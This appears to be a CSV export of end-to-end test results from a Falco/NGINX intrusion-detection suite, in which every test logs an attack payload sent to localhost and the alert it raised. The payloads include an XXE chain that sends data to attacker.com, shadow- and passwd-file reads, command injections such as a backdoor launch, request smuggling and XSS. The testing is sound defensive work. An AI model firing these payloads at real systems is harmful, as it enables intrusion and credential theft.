"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_002` |
| **Name** | Direct absolute path to shadow file |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `/etc/shadow`
- **Encoded**: `/etc/shadow`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~66000ms
- **Timestamp**: 14:44:52.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_002-1770821092354-w87y0g pattern_id=PATH_ABS_002 uri=/?q=/etc/shadow client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_002-1770821092354-w87y0g pattern_id=PATH_ABS_002 uri=/?q=/etc/shadow client=127.0.0.1

**Falco Log Entry**:
```
14:44:52.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_002-1770821092354-w87y0g pattern_id=PATH_ABS_002 uri=/?q=/etc/shadow client=127.0.0.1
```","1","test_e2e_with_logs[207_PATH_ABS_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_PARAM_001` |
| **Name** | XXE Parameter Entity Chaining |
| **Category** | XXE |
| **Subcategory** | parameter_entity |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!DOCTYPE foo [<!ENTITY % data SYSTEM ""http://attacker.com/collect""><!ENTITY % eval ""<!ENTITY exfil SYSTEM '%data;'>"">%eval;]>`
- **Encoded**: `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20data%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fcollect%22%3E%3C%21ENTITY%20%25%20eval%20%22%3C%21ENTITY%20exfil%20SYSTEM%20%27%25data%3B%27%3E%22%3E%25eval%3B%5D%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~49000ms
- **Timestamp**: 14:45:09.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_PARAM_001-1770821109350-6xm86r pattern_id=XXE_PARAM_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20data%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fcollect%22%3E%3C%21ENTITY%20%25%20eval%20%22%3C%21ENTITY%20exfil%20SYSTEM%20%27%25data%3B%27%3E%22%3E%25eval%3B%5D%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_PARAM_001-1770821109350-6xm86r pattern_id=XXE_PARAM_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20data%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fcollect%22%3E%3C%21ENTITY%20%25%20eval%20%22%3C%21ENTITY%20exfil%20SYSTEM%20%27%25data%3B%27%3E%22%3E%25eval%3B%5D%3E client=127.0.0.1

**Falco Log Entry**:
```
14:45:09.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_PARAM_001-1770821109350-6xm86r pattern_id=XXE_PARAM_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20data%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fcollect%22%3E%3C%21ENTITY%20%25%20eval%20%22%3C%21ENTITY%20exfil%20SYSTEM%20%27%25data%3B%27%3E%22%3E%25eval%3B%5D%3E client=127.0.0.1
```","2","test_e2e_with_logs[493_XXE_PARAM_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_FUNC_001` |
| **Name** | XPath count function injection |
| **Category** | XPATH |
| **Subcategory** | function_abuse |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' and count(//user)>0 and '1'='1`
- **Encoded**: `%27%20and%20count%28%2F%2Fuser%29%3E0%20and%20%271%27%3D%271`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 14:45:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_001-1770821115339-xjia9x pattern_id=XPATH_FUNC_001 uri=/?q=%27%20and%20count%28%2F%2Fuser%29%3E0%20and%20%271%27%3D%271 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_001-1770821115339-xjia9x pattern_id=XPATH_FUNC_001 uri=/?q=%27%20and%20count%28%2F%2Fuser%29%3E0%20and%20%271%27%3D%271 client=127.0.0.1

**Falco Log Entry**:
```
14:45:15.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_001-1770821115339-xjia9x pattern_id=XPATH_FUNC_001 uri=/?q=%27%20and%20count%28%2F%2Fuser%29%3E0%20and%20%271%27%3D%271 client=127.0.0.1
```","2","test_e2e_with_logs[443_XPATH_FUNC_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_PROC_002` |
| **Name** | Nohup background execution |
| **Category** | CMDINJ |
| **Subcategory** | process_spawning |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `nohup /tmp/backdoor.sh &`
- **Encoded**: `nohup%20%2Ftmp%2Fbackdoor.sh%20%26`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 14:45:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_PROC_002-1770821115903-gxkpaj pattern_id=CMD_PROC_002 uri=/?q=nohup%20%2Ftmp%2Fbackdoor.sh%20%26 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_PROC_002-1770821115903-gxkpaj pattern_id=CMD_PROC_002 uri=/?q=nohup%20%2Ftmp%2Fbackdoor.sh%20%26 client=127.0.0.1

**Falco Log Entry**:
```
14:45:15.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_PROC_002-1770821115903-gxkpaj pattern_id=CMD_PROC_002 uri=/?q=nohup%20%2Ftmp%2Fbackdoor.sh%20%26 client=127.0.0.1
```","2","test_e2e_with_logs[357_CMD_PROC_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_012` |
| **Name** | Double pipe OR operator |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `||ls`
- **Encoded**: `%7C%7Cls`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~64000ms
- **Timestamp**: 14:44:54.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_012-1770821094851-2x36jo pattern_id=CMD_BASIC_012 uri=/?q=%7C%7Cls client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_012-1770821094851-2x36jo pattern_id=CMD_BASIC_012 uri=/?q=%7C%7Cls client=127.0.0.1

**Falco Log Entry**:
```
14:44:54.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_012-1770821094851-2x36jo pattern_id=CMD_BASIC_012 uri=/?q=%7C%7Cls client=127.0.0.1
```","1","test_e2e_with_logs[311_CMD_BASIC_012]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_005` |
| **Name** | Null byte injection traversal |
| **Category** | PATH |
| **Subcategory** | advanced_techniques |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..%00/`
- **Encoded**: `..%2500%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 14:45:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Advanced path traversal attempt detected` |
| **Matched Rule** | `[NGINX Traversal] Advanced path traversal attempt detected test_id=PATH_ADV_005-1770821103380-2e0rtl pattern_id=PATH_ADV_005 uri=/?q=..%2500%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Advanced path traversal attempt detected test_id=PATH_ADV_005-1770821103380-2e0rtl pattern_id=PATH_ADV_005 uri=/?q=..%2500%2F client=127.0.0.1

**Falco Log Entry**:
```
14:45:03.000000000: Warning [NGINX Traversal] Advanced path traversal attempt detected test_id=PATH_ADV_005-1770821103380-2e0rtl pattern_id=PATH_ADV_005 uri=/?q=..%2500%2F client=127.0.0.1
```","1","test_e2e_with_logs[219_PATH_ADV_005]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_066` |
| **Name** | IFS Bypass Cat Passwd |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `${IFS}cat${IFS}/etc/passwd`
- **Encoded**: `%24%7BIFS%7Dcat%24%7BIFS%7D%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~37000ms
- **Timestamp**: 14:45:21.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_ADV_066-1770821121920-bivs6u pattern_id=CMD_ADV_066 uri=/?q=%24%7BIFS%7Dcat%24%7BIFS%7D%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_ADV_066-1770821121920-bivs6u pattern_id=CMD_ADV_066 uri=/?q=%24%7BIFS%7Dcat%24%7BIFS%7D%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
14:45:21.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_ADV_066-1770821121920-bivs6u pattern_id=CMD_ADV_066 uri=/?q=%24%7BIFS%7Dcat%24%7BIFS%7D%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[289_CMD_ADV_066]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_HEADER_002` |
| **Name** | Double Content-Length |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | header_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `Content-Length: 10
Content-Length: 0`
- **Encoded**: `Content-Length%3A%2010%0D%0AContent-Length%3A%200`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~11000ms
- **Timestamp**: 14:45:47.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_HEADER_002-1770821147843-g82vbs pattern_id=HRS_HEADER_002 uri=/?q=Content-Length%3A%2010%0D%0AContent-Length%3A%200 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_HEADER_002-1770821147843-g82vbs pattern_id=HRS_HEADER_002 uri=/?q=Content-Length%3A%2010%0D%0AContent-Length%3A%200 client=127.0.0.1

**Falco Log Entry**:
```
14:45:47.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_HEADER_002-1770821147843-g82vbs pattern_id=HRS_HEADER_002 uri=/?q=Content-Length%3A%2010%0D%0AContent-Length%3A%200 client=127.0.0.1
```","2","test_e2e_with_logs[449_HRS_HEADER_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASH_001` |
| **Name** | Direct bash command execution |
| **Category** | CMDINJ |
| **Subcategory** | bash_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; /bin/bash -c 'whoami'`
- **Encoded**: `%3B%20%2Fbin%2Fbash%20-c%20'whoami'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~59000ms
- **Timestamp**: 14:44:59.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_001-1770821099863-wxvrro pattern_id=CMD_BASH_001 uri=/?q=%3B%20%2Fbin%2Fbash%20-c%20'whoami' client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_001-1770821099863-wxvrro pattern_id=CMD_BASH_001 uri=/?q=%3B%20%2Fbin%2Fbash%20-c%20'whoami' client=127.0.0.1

**Falco Log Entry**:
```
14:44:59.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_001-1770821099863-wxvrro pattern_id=CMD_BASH_001 uri=/?q=%3B%20%2Fbin%2Fbash%20-c%20'whoami' client=127.0.0.1
```","1","test_e2e_with_logs[296_CMD_BASH_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_011` |
| **Name** | DOM location hash injection |
| **Category** | XSS |
| **Subcategory** | dom |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `location.hash=alert(1)//`
- **Encoded**: `location.hash%3Dalert(1)%2F%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~57000ms
- **Timestamp**: 14:45:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_011-1770821101887-uxhy19 pattern_id=XSS_DOM_011 uri=/?q=location.hash%3Dalert(1)%2F%2F client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_011-1770821101887-uxhy19 pattern_id=XSS_DOM_011 uri=/?q=location.hash%3Dalert(1)%2F%2F client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:45:01.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_011-1770821101887-uxhy19 pattern_id=XSS_DOM_011 uri=/?q=location.hash%3Dalert(1)%2F%2F client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[155_XSS_DOM_011]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
